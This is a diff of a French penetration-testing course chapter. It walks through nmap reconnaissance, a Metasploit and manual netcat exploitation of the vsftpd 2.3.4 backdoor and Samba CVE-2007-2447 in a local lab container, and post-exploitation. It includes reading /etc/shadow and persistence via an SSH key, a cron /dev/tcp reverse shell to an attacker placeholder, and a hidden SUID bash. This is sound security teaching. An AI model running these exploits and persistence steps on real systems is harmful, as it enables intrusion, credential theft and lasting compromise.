@@ -4,52 +4,43 @@
 
 ## Objectifs pédagogiques
 
-- Construire une kill chain ATT&CK complète de la reconnaissance à la persistance
+- Construire une kill chain ATT&CK complète (reconnaissance → persistance)
 - Mapper les méthodologies OWASP/PTES sur les tactiques ATT&CK
-- Réaliser une reconnaissance réseau complète avec nmap (T1046, T1595)
+- Réaliser une reconnaissance réseau complète avec nmap (T1046)
 - Exploiter vsftpd 2.3.4 et Samba 3.0.20 avec Metasploit
 - Obtenir un shell root et mettre en place une persistance (TA0003)
 
 ---
 
-## Setup rapide — Définir les variables
+## Introduction
 
-```bash
-if [ -f /.dockerenv ]; then
-    TARGET="vsftpd"        ; PORT_FTP="21"  ; PORT_SMB="445"
-    TARGET_MYSQL="vsftpd"  ; PORT_MYSQL="3306"
-    echo "→ Scénario B"
-else
-    TARGET="localhost"     ; PORT_FTP="21"  ; PORT_SMB="445"
-    TARGET_MYSQL="localhost"; PORT_MYSQL="3306"
-    echo "→ Scénario A"
-fi
-KALI_IP=$(hostname -I | awk '{print $1}')
-DOCKER_BRIDGE=$(ip addr show docker0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
-echo "Kali IP : $KALI_IP  |  Docker bridge : $DOCKER_BRIDGE"
-```
+Un pentest n'est pas du "cassage" hasardeux. C'est une démarche méthodique en 7 phases, exigée par la réglementation (RGS, NIS2) pour toute administration manipulant des données sensibles. Le rapport de pentest est un **livrable réglementaire** qui conditionne l'homologation de sécurité du système.
+
+Dans ce chapitre, vous construirez votre première kill chain ATT&CK complète : chaque phase de la reconnaissance à la persistance sera taguée avec sa tactique et sa technique.
+
+> **Sources :** [PTES Technical Guidelines](http://www.pentest-standard.org/). [RGS v2.0 — ANSSI](https://www.ssi.gouv.fr/rgs).
 
 ---
 
-## 1. Méthodologies de pentest et ATT&CK Kill Chain
+## 1. Méthodologies de pentest et ATT&CK
 
 ```mermaid
 flowchart LR
-    subgraph PTES["PTES (Pentesting Standard)"]
-        P1["Passive Recon"] --> P2["Active Recon"]
-        P2 --> P3["Vuln Identification"]
+    subgraph PTES["Méthodologie PTES"]
+        P1["Recon passive"] --> P2["Recon active"]
+        P2 --> P3["Identification vulns"]
         P3 --> P4["Exploitation"]
-        P4 --> P5["Post-Exploitation"]
+        P4 --> P5["Post-exploitation"]
     end
-    subgraph ATTACK["MITRE ATT&CK"]
+    subgraph ATTACK["Tactiques ATT&CK"]
         TA1["TA0043 Recon"] --> TA2["TA0007 Discovery"]
         TA2 --> TA3["TA0007 Discovery"]
-        TA3 --> TA4["TA0001 Initial Access / TA0002 Execution"]
-        TA4 --> TA5["TA0003 Persistence / TA0004 PrivEsc"]
+        TA3 --> TA4["TA0001 Initial Access"]
+        TA4 --> TA5["TA0003 Persistence"]
     end
 ```
 
-### Kill chain ATT&CK de ce chapitre
+### Kill chain du jour
 
 ```mermaid
 flowchart LR
@@ -60,54 +51,62 @@ flowchart LR
 
 ---
 
+## 2. Reconnaissance — TA0007 Discovery
+
+La reconnaissance est la phase la plus importante : 70% du temps d'un pentest. Elle détermine la surface d'attaque.
+
+```bash
+# Passive (sans toucher la cible)
+whois <DOMAINE>
+curl -s "https://crt.sh/?q=%25.<DOMAINE>&output=json" | jq '.[].name_value' | sort -u
+
+# Active (scan direct)
+nmap -sV -sC -p- <IP> -oA recon/full    # Complet
+nmap --script vuln <IP> -oA recon/vuln   # Vulnérabilités
+nmap --script ftp-* <IP>                 # Spécifique FTP
+```
+
+---
+
 ## Lab 2.1 — Reconnaissance du conteneur Metasploitable
 
-### 📋 Fiche de lab
+### 📋 Fiche
 
-| Propriété | Valeur |
-|---|---|
-| **Durée** | 45 min |
-| **Conteneur** | `vsftpd` (ports 21, 22, 445, 3306, 5432...) |
-| **Dossier de travail** | `~/cours-hacking/jour-2/labs/` |
-| **Fichiers à créer** | `recon.sh` |
-| **Tactique ATT&CK** | TA0007 Discovery → T1046 Network Scan |
+| Durée | Conteneur | Dossier | Tactique ATT&CK |
+|---|---|---|---|
+| 45 min | vsftpd (Metasploitable 2) | `~/cours-hacking/jour-2/labs/` | TA0007 → T1046 |
 
-### Prérequis
+### Contexte métier
 
-- [x] Conteneur vsftpd lancé : `docker compose up -d vsftpd`
-- [x] Dossier créé : `mkdir -p ~/cours-hacking/jour-2/labs/recon && cd ~/cours-hacking/jour-2/labs`
-- [x] Variables chargées (voir Setup rapide ci-dessus)
+Un pentest commence toujours par un scan exhaustif. Le client attend la liste complète des services exposés avec leurs versions. C'est la base du rapport.
 
 ### Étape 1 — Scan complet
 
 ```bash
-cd ~/cours-hacking/jour-2/labs
-nmap -sV -sC -p- "$TARGET" -oA recon/full_scan 2>&1 | tee recon/scan_output.txt
+mkdir -p ~/cours-hacking/jour-2/labs/recon && cd ~/cours-hacking/jour-2/labs
+nmap -sV -sC -p- localhost -oA recon/full_scan 2>&1 | tee recon/scan.txt
 ```
 
-Résultat attendu (extrait) :
+Résultat attendu :
 
 ```
 PORT     STATE SERVICE     VERSION
 21/tcp   open  ftp         vsftpd 2.3.4
-22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1
-23/tcp   open  telnet      Linux telnetd
+22/tcp   open  ssh         OpenSSH 4.7p1
 80/tcp   open  http        Apache httpd 2.2.8
-445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian
-3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
-5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
+445/tcp  open  netbios-ssn Samba smbd 3.0.20
+3306/tcp open  mysql       MySQL 5.0.51a
+5432/tcp open  postgresql  PostgreSQL DB 8.3.0
 ```
 
-**Checkpoint A :** Au moins 8 ports ouverts identifiés.
+**Checkpoint A :** 6+ ports ouverts identifiés avec leurs versions.
 
 ### Étape 2 — Scan de vulnérabilités ciblé
 
 ```bash
-nmap --script ftp-vsftpd-backdoor -p "$PORT_FTP" "$TARGET" | tee recon/vsftpd_scan.txt
-nmap --script smb-vuln* -p "$PORT_SMB" "$TARGET" | tee recon/smb_scan.txt
+nmap --script ftp-vsftpd-backdoor -p 21 localhost | tee recon/vsftpd.txt
+nmap --script smb-vuln* -p 445 localhost | tee recon/smb.txt
 ```
-
-**Checkpoint B :** Les scripts NSE confirment la backdoor vsftpd et les vulns SMB.
 
 ### Étape 3 — Script de reconnaissance automatisé
 
@@ -115,58 +114,43 @@ Créez `~/cours-hacking/jour-2/labs/recon.sh` :
 
 ```bash
 #!/bin/bash
-TARGET="${1:-localhost}"
-PORT_FTP="${2:-21}"
-PORT_SMB="${3:-445}"
 OUTDIR="recon/$(date +%H%M)"
 mkdir -p "$OUTDIR"
-
-echo "[*] TA0007 Discovery — $TARGET"
-nmap -sV -sC -p 21,22,23,80,445,3306,5432 "$TARGET" -oA "$OUTDIR/ports"
-nmap --script ftp-vsftpd-backdoor -p "$PORT_FTP" "$TARGET" -oA "$OUTDIR/vsftpd"
-nmap --script smb-vuln* -p "$PORT_SMB" "$TARGET" -oA "$OUTDIR/smb"
-echo "[+] Résultats dans $OUTDIR/"
-ls -la "$OUTDIR/"
+nmap -sV -sC -p 21,22,80,445,3306,5432 localhost -oA "$OUTDIR/ports"
+nmap --script ftp-vsftpd-backdoor -p 21 localhost -oA "$OUTDIR/vsftpd"
+nmap --script smb-vuln* -p 445 localhost -oA "$OUTDIR/smb"
+echo "[+] Résultats dans $OUTDIR/" && ls -la "$OUTDIR/"
 ```
 
 ```bash
-chmod +x recon.sh
-# Scénario A :
-./recon.sh localhost 21 445
-# Scénario B :
-./recon.sh vsftpd 21 445
+chmod +x recon.sh && ./recon.sh
 ```
 
 ---
 
 ## Lab 2.2 — Exploitation vsftpd 2.3.4 (Backdoor)
 
-### 📋 Fiche de lab
+### 📋 Fiche
 
-| Propriété | Valeur |
-|---|---|
-| **Durée** | 40 min |
-| **Conteneur** | `vsftpd` (backdoor sur port 6200) |
-| **Tactique ATT&CK** | TA0001 Initial Access → T1190 |
+| Durée | Conteneur | Technique ATT&CK |
+|---|---|---|
+| 40 min | vsftpd (port 21 → backdoor port 6200) | T1190 Exploit Public-Facing App |
 
-### Comprendre la vulnérabilité
+### Contexte technique
 
-vsftpd 2.3.4 a une backdoor : un nom d'utilisateur contenant `:)` ouvre un shell root sur le port 6200.
+En 2011, le code source de vsftpd 2.3.4 a été compromis : un nom d'utilisateur contenant `:)` ouvre silencieusement un shell root sur le port 6200. Ce type de backdoor (supply chain attack) est toujours d'actualité — l'attaque SolarWinds (2020) suivait exactement le même principe.
 
 ```mermaid
 flowchart LR
-    A["Attaquant"] -->|"ftp → USER user:)"| B["vsftpd 2.3.4"]
-    B -->|"détecte le smiley"| C["Port 6200 — Shell root"]
+    A["Attaquant"] -->|"ftp USER user:)"| B["vsftpd 2.3.4"]
+    B -->|"Shell root ouvert"| C["Port 6200"]
     A -->|"nc port 6200"| C
 ```
 
-### Étape 1 — Exploitation avec Metasploit
+### Étape 1 — Exploitation Metasploit
 
 ```bash
-# Scénario A : set RHOSTS localhost
-# Scénario B : set RHOSTS vsftpd
-
-msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS $TARGET; set RPORT $PORT_FTP; run"
+msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS localhost; set RPORT 21; run"
 ```
 
 Sortie attendue :
@@ -178,31 +162,25 @@ Sortie attendue :
 [*] Command shell session 1 opened
 ```
 
-**Checkpoint A :** `uid=0(root)` — shell root obtenu.
+**Checkpoint :** `uid=0(root)` — shell root direct, pas d'escalade nécessaire.
 
-### Étape 2 — Exploitation manuelle (sans Metasploit)
+### Étape 2 — Exploitation manuelle
 
 ```bash
-# Terminal 1 : déclencher la backdoor
-echo -e "user :)\npass x" | nc "$TARGET" "$PORT_FTP" > /dev/null 2>&1 &
-
-# Attendre 2 secondes
-
-# Terminal 2 : connexion au shell
-nc "$TARGET" 6200
+echo -e "user :)\npass x" | nc localhost 21 > /dev/null 2>&1 &
+sleep 2
+nc localhost 6200
 whoami
 # → root
 ```
-
-**Checkpoint B :** `whoami` = `root` via exploitation manuelle.
 
 ### Étape 3 — Post-exploitation
 
 ```bash
 whoami                         # root
 hostname                       # ID conteneur
-uname -a                       # Kernel
-cat /etc/shadow | head -5      # Hashs de mots de passe
+uname -a                       # Kernel version
+cat /etc/shadow | head -5      # Hashs utilisateurs
 ss -tulpn                      # Services internes
 ```
 
@@ -210,85 +188,68 @@ ss -tulpn                      # Services internes
 
 ## Lab 2.3 — Exploitation Samba + Kill Chain complète
 
-### 📋 Fiche de lab
+### 📋 Fiche
 
-| Propriété | Valeur |
-|---|---|
-| **Durée** | 50 min |
-| **Conteneur** | `vsftpd` (Samba 3.0.20 sur port 445) |
-| **Tactiques** | TA0001 → TA0002 → TA0003 → TA0004 |
+| Durée | Conteneur | Techniques |
+|---|---|---|
+| 50 min | vsftpd (port 445) | T1210 + T1059.004 + T1098.004 |
 
-### Étape 1 — Exploitation Samba usermap (CVE-2007-2447)
+### Contexte technique
 
-Technique ATT&CK : T1210 Exploitation of Remote Services → TA0008 Lateral Movement
+Samba 3.0.20 (CVE-2007-2447) a un `usermap` script vulnérable : les métacaractères shell dans le nom d'utilisateur sont exécutés. C'est une **command injection** dans un service réseau — même principe que le lab DVWA du J1, mais sur un service SMB.
+
+### Étape 1 — Exploitation Samba
 
 ```bash
-msfconsole -q -x "use exploit/multi/samba/usermap_script; set RHOSTS $TARGET; set RPORT $PORT_SMB; run"
-```
-
-Sortie attendue :
-
-```
-[*] Command shell session opened
+msfconsole -q -x "use exploit/multi/samba/usermap_script; set RHOSTS localhost; set RPORT 445; run"
+# [*] Command shell session 2 opened
 whoami
-# root
+# → root
 ```
 
-### Étape 2 — Comparaison des exploits
+### Étape 2 — Comparaison des deux exploits
 
-| Caractéristique | vsftpd 2.3.4 | Samba 3.0.20 |
+| | vsftpd 2.3.4 | Samba 3.0.20 |
 |---|---|---|
-| **Service** | FTP (21) | SMB (445) |
-| **ATT&CK** | T1190 | T1210 |
-| **Tactique** | Initial Access | Lateral Movement |
-| **Mécanisme** | Backdoor binaire | Usermap shell escape |
+| Service | FTP (21) | SMB (445) |
+| ATT&CK | T1190 | T1210 |
+| Tactique | Initial Access | Lateral Movement |
+| Mécanisme | Backdoor binaire | Command injection |
+| Impact | root direct | root direct |
 
 ### Étape 3 — Persistance (TA0003)
 
-Dans le shell root obtenu :
+Dans le shell root :
 
 ```bash
-# Méthode 1 : Clé SSH
+# SSH key permanente
 mkdir -p /root/.ssh
-echo "VOTRE_CLE_PUBLIQUE_SSH" >> /root/.ssh/authorized_keys
+echo "VOTRE_CLE_PUBLIQUE" >> /root/.ssh/authorized_keys
 chmod 600 /root/.ssh/authorized_keys
 
-# Méthode 2 : Cron reverse shell (remplacer par l'IP Kali adaptée)
-# Scénario A : utiliser $DOCKER_BRIDGE (172.17.0.1)
-# Scénario B : utiliser $KALI_IP ou le nom de service kali-attacker
+# Cron reverse shell
 echo "* * * * * root bash -c 'bash -i >& /dev/tcp/<KALI_IP>/5555 0>&1'" >> /etc/crontab
 
-# Méthode 3 : SUID bash caché
-cp /bin/bash /tmp/.hidden_bash
-chmod 4755 /tmp/.hidden_bash
+# SUID bash caché
+cp /bin/bash /tmp/.bash_hidden && chmod 4755 /tmp/.bash_hidden
 ```
 
-### Étape 4 — Documentation Kill Chain
+### Étape 4 — Kill chain documentée
 
-```mermaid
-flowchart LR
-    A["TA0007<br/>T1046<br/>nmap scan"] --> B["TA0001<br/>T1190<br/>vsftpd exploit"]
-    B --> C["TA0002<br/>T1059.004<br/>shell root"]
-    C --> D["TA0003<br/>T1098.004<br/>SSH persistence"]
-```
-
-Complétez ce tableau :
-
-| Phase | Tactic | Technique | Outil | Résultat |
-|---|---|---|---|---|
-| 1 | TA0007 Discovery | T1046 | nmap -sV | 8+ ports identifiés |
-| 2 | TA0001 Initial Access | T1190 | msf vsftpd | Shell root |
-| 3 | TA0002 Execution | T1059.004 | netcat | Command shell |
-| 4 | TA0003 Persistence | T1098.004 | SSH keys | Clé ajoutée |
+| Phase | Tactic | Technique | Outil |
+|---|---|---|---|
+| 1 | TA0007 Discovery | T1046 | nmap -sV |
+| 2 | TA0001 Initial Access | T1190 | Metasploit vsftpd |
+| 3 | TA0002 Execution | T1059.004 | Shell root |
+| 4 | TA0003 Persistence | T1098.004 | SSH key |
 
 ### Checkpoints finaux
 
-- [ ] nmap identifie 8+ ports
-- [ ] vsftpd 2.3.4 exploité → shell root
-- [ ] Samba 3.0.20 exploité → shell root
+- [ ] nmap : 6+ ports identifiés
+- [ ] vsftpd exploité → shell root
+- [ ] Samba exploité → shell root
 - [ ] Persistance mise en place
-- [ ] Kill chain ATT&CK documentée
-- [ ] `/etc/shadow` lisible dans le shell
+- [ ] Kill chain documentée
 
 ---
 
@@ -296,23 +257,18 @@ Complétez ce tableau :
 
 ### Exercice 1 : Couche ATT&CK Navigator J2
 
-**Énoncé :** Créez une couche avec les techniques du jour. Exportez dans `~/cours-hacking/jour-2/killchain_j2.json`.
+**Énoncé :** Créez une couche avec T1046, T1190, T1210, T1059.004, T1098.004. Exportez en JSON.
 
-<details>
-<summary><strong>Solution</strong></summary>
-
-ATT&CK Navigator → New Layer → T1046, T1190, T1210, T1059.004, T1098.004
-Colorer par criticité. Exporter JSON.
+<details><summary><strong>Solution</strong></summary>
+ATT&CK Navigator → New Layer → ajouter les 5 techniques → Download JSON
 </details>
 
 ### Exercice 2 : Mapping EternalBlue
 
-**Énoncé :** WannaCry utilisait EternalBlue. Quelles techniques ATT&CK ?
+**Énoncé :** WannaCry (2017) : quelles techniques ATT&CK ?
 
-<details>
-<summary><strong>Solution</strong></summary>
-
-EternalBlue → T1210 (TA0008), DoublePulsar → T1543.003 (TA0003), Ransomware → T1486 (TA0014)
+<details><summary><strong>Solution</strong></summary>
+- EternalBlue → T1210 (TA0008), DoublePulsar → T1543.003 (TA0003), Chiffrement → T1486 (TA0014)
 </details>
 
 ---
@@ -320,9 +276,9 @@ EternalBlue → T1210 (TA0008), DoublePulsar → T1543.003 (TA0003), Ransomware 
 ## Points clés à retenir
 
 - Kill chain ATT&CK : TA0007 → TA0001 → TA0002 → TA0003
-- vsftpd 2.3.4 → T1190 (backdoor smiley), Samba 3.0.20 → T1210 (usermap)
-- La persistance (TA0003) distingue intrusion et compromission durable
-- **Reverse shell IP** : Scénario A → `172.17.0.1`, Scénario B → IP conteneur Kali
+- vsftpd 2.3.4 → T1190 (backdoor), Samba 3.0.20 → T1210 (command injection)
+- La persistance (TA0003) distingue une intrusion d'une compromission durable
+- **Rapport de pentest = livrable réglementaire** (homologation RGS, conformité NIS2)
 
 ## Pour aller plus loin
 
@@ -334,4 +290,3 @@ EternalBlue → T1210 (TA0008), DoublePulsar → T1543.003 (TA0003), Ransomware 
 
 *Chapitre précédent : [Jour 1](./JOUR-01.md)*
 *Chapitre suivant : [Jour 3](./JOUR-03.md)*
-*Guide Environnement : [ENVIRONNEMENT.md](./ENVIRONNEMENT.md)*
